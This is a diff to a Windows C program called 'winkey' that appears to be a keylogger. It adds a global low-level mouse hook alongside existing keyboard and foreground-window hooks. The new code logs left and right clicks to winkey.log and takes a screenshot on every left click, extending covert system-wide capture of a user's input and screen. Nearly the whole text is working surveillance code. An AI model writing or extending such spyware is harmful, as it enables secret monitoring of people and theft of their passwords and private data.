@@ -1,9 +1,31 @@
 #include "winkey.h"
+#include "mapkey.h"
 
 #pragma comment(lib, "user32.lib")
 
 HHOOK			keyboardHook;
+HHOOK			mouseHook;
 HWINEVENTHOOK	windowHook;
+
+LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	FILE* flog = 0;
+
+	if (nCode == HC_ACTION) {
+		if (wParam == WM_LBUTTONDOWN) {
+			fopen_s(&flog, "winkey.log", "a");
+			fprintf_s(flog, "%s", "[LeftClick]");
+			fclose(flog);
+			DoScreenshot();
+		}
+		else if (wParam == WM_RBUTTONDOWN) {
+			fopen_s(&flog, "winkey.log", "a");
+			fprintf_s(flog, "%s", "[RightClick]");
+			fclose(flog);
+		}
+	}
+	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
+}
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -61,6 +83,7 @@ int		main(void)
 	signal(SIGINT, SignalHandler);
 	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
 									LowLevelKeyboardProc, 0, 0);
+	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, 0, 0);
 	windowHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND,
 								EVENT_SYSTEM_FOREGROUND, 0,
 								Wineventproc, 0, 0,
